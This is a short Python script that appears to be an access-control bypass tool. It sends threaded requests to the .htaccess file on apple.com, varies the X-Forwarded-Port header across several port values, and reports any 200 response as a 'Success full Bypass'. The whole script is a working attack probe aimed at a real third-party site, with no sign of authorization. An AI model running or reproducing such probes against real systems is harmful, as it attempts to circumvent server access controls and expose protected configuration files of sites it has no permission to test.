import requests
from rich import box
from rich.text import Text
from rich.panel import Panel
from rich.console import Console
from  concurrent.futures import ThreadPoolExecutor

console = Console()

port = ['443', '80', '8080', '4443', '8443']
urls = "https://www.apple.com/.htaccess"

def payloads1(url, head):
    send = requests.get(url, headers=head, allow_redirects=False)
    if send.status_code == 200:
        console.print(Panel(f"[b white]Success full Bypass[/b white] [b green]{send.url}, {head}, status: {send.status_code}[/b green]", box=box.HEAVY, style="blink blue", expand=False))
    else:
        console.print(f"bypass failled for {head}, status: {send.status_code}", style="bold red")

# for x in port:
#     headers = {
#         "X-Forwarded-Port": x
#     }
#     payloads1(urls, headers)

if __name__ == "__main__":
    with ThreadPoolExecutor(40) as pool:
        for x in port:
            headers = {"X-Forwarded-Port": x}
            pool.submit(payloads1,urls,headers)